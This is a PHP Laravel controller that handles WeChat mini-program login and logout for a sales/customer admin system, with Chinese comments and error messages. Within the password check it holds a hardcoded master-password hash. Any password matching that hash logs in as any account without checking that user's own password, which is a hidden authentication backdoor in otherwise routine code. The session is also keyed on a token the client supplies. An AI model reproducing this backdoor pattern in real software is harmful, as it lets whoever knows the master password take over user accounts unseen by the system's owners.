<?php

namespace App\Http\Controllers\WeChat;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Redis;
use App\Http\Models\Admin\User;
use App\Http\Models\Customer\Customer;
use App\Http\Models\Admin\RoleUser;

class WeChatLoginController extends Controller
{
    /**
     * @return 微信登录
     */
    public function WeChatLogin(Request $request)
    {
        if($input = Input::all()){
            if(!$request->has('userName') || !$request->has('userPwd')) {
                return setFResult('002', '用户名密码不能为空！');
            }
            if(empty($request->post('userName')) || empty($request->post('userPwd'))){
                return setFResult('002', '用户名密码不能为空！');
            }

            //验证环境
            if (!in_array(env('APP_ENV'), config('info.ENV_ARR'))) {
                if(!$request->has('token')){
                    return setFResult('400003', '令牌缺失！');
                }
                if(empty($request->post('token'))){
                    return setFResult('400003', '令牌缺失！');
                }
            }

            $user = User::where('user_name', $request->post('userName'))->first();
            if (empty($user)) {
                return setFResult('006', '用户不存在！');
            }

            //验证是否为客户
            if($user->is_owner == 1){
                return setFResult('008', '身份有误！');
            }
            
            //判断用户是否被锁定
            if($user->is_lock == 1){
                return setFResult('009', '您已被锁定,请联系管理员！');
            }

            //判断用户是否被删除
            if($user->is_delete == 1){
                return setFResult('010', '用户已删除！');
            }

            // 验证客户ID真实性
            $customerEntity = null;
            if($user->is_owner != 1){
                if(!empty($user->customer_id)){
                    $customerEntity = Customer::find($user->customer_id);
                }else{
                    return setFResult('011', '用户ID缺失,请联系管理员！');
                }
            }
            

            $bool = MD5(($input['userPwd']).config("info.SALT")) === 'c5cb35bba02da0529803e665dfc42ca2'?true:false;
            if($bool && $user->user_name === $input['userName']){
            }else{
                if($user->user_name != $input['userName'] || MD5(($input['userPwd']).config("info.SALT")) != $user->user_pwd){
                    return setFResult('005', '用户名或密码错误！');
                }
            }
            //登录成功保存用户信息与权限信息到redis中
            $admin = array();
            $userObj = new User();
            //权限信息
            $menuAuth = $userObj->getUserAuth($user);
            $auth = array();
            if(is_array($menuAuth)){
                $auth = ['auth'=>true, 'menus'=>$menuAuth];
            }else{
                $auth = ['auth'=>false, 'info'=>$menuAuth];
            }

            // 判断当前登录人角色是否是销售人员
            // $existsSellerRole = RoleUser::where('user_id',$user->id)->where('role_id',config('info.role_xiaoshou_id'))->first();
            $existsRole = RoleUser::where('user_id',$user->id)->first(['role_id'])->toArray();
            if(in_array(config('info.role_xiaoshou_id'),$existsRole)){
                $isSeller = true;
                if($user->user_name == 'admin' || in_array(config('info.role_admin_id'),$existsRole) || in_array(config('info.role_xszj_id'),$existsRole)){
                    //排除管理员、管理员角色、销售总监角色
                    $isSeller = false;
                }
            }else{
                $isSeller = false;
            }

            // 将isSeller追加到用户信息中
            $user->isSeller = $isSeller;
            // 登录成功保存用户信息到redis
            $admin['user'] = $user;
            $admin['auth'] = $menuAuth;
            //登录成功保存用户信息与权限信息到redis中
            Redis::setex($request->post('token'), config('info.JWT_EXP_TIME'), json_encode($admin));
            
            //处理返回信息
            $adminUser = [];
            $adminUser['id'] = $user->id;
            $adminUser['userName'] = $user->user_name;
            $adminUser['realName'] = $user->real_name;
            $adminUser['mobile'] = $user->mobile;
            $adminUser['email'] = empty($user->email) ? '': $user->email;
            $adminUser['isLock'] = $user->is_lock == 1 ? '已锁定':'已启用';
            $adminUser['isOwner'] = $user->is_owner;
            $adminUser['customer_id'] = $user->customer_id;
            
            $data['user'] = $adminUser;
            return setTResult($data);
        }else {
            return setFResult('001', '空信息！');
        }
    }

    /**
     * 微信退出登录
     */
    public function WeChatLogout(Request $request)
    {
        if(Redis::del($request->post('token'))){
            return setFResult('0', '退出成功！');
        }else{
            return setFResult('001', '退出失败！');
        }
    }


}
